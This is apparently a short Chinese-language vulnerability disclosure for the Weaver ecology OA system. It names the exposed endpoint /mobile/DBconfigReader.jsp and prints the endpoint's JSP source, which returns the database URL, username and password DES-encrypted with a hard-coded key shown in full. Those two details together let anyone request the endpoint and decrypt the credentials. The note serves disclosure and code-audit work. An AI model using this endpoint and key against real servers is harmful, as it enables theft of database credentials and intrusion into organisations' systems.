
# 泛微ecology OA系统接口存在数据库配置信息泄露漏洞

## /mobile/DBconfigReader.jsp

` http://x.x.x.x:8090/mobile/DBconfigReader.jsp`

![](./dbconfig.png)

![](./fofa.png)

## Fortify 代码审计 检测出-弱加密算法
![](./Fortify.jpg)

`SecretKey key = SecretKeyFactory.getInstance("DES").generateSecret(dks1);`

```
<%@ page language="java" contentType="text/html; charset=UTF-8"%>
<%@ page import="weaver.file.Prop" %>
<%@ page import="javax.crypto.spec.DESKeySpec" %>
<%@ page import="javax.crypto.*" %>
<%
	String conStr=Prop.getPropValue("weaver","ecology.url");
	String conUser=Prop.getPropValue("weaver","ecology.user");
	String conPsw=Prop.getPropValue("weaver","ecology.password");
	String loginType=Prop.getPropValue("weaver","authentic");
//	StringBuffer sb = new StringBuffer();
//	sb.append("url="+conStr+",");
//	sb.append("user="+conUser+",");
//	sb.append("password="+conPsw);
	String sb="url="+conStr+",user="+conUser+",password="+conPsw+",logintype="+loginType;
 	byte[]  str = sb.getBytes();
	String keyString = "1z2x3c4v5b6n";
	byte[] keyByte = keyString.getBytes();
	// 创建一个密匙工厂，然后用它把DESKeySpec对象转换成一个SecretKey对象
	DESKeySpec dks1 = new DESKeySpec(keyByte);
    SecretKey key = SecretKeyFactory.getInstance("DES").generateSecret(dks1);
	Cipher cipher = Cipher.getInstance("DES");
	cipher.init(Cipher.ENCRYPT_MODE, key);  
	byte[] cipherText = cipher.doFinal(str);
	//System.out.println(cipherText.length);
	ServletOutputStream sos = response.getOutputStream();
	sos.write(cipherText);
	sos.flush();
	sos.close();
%>
```
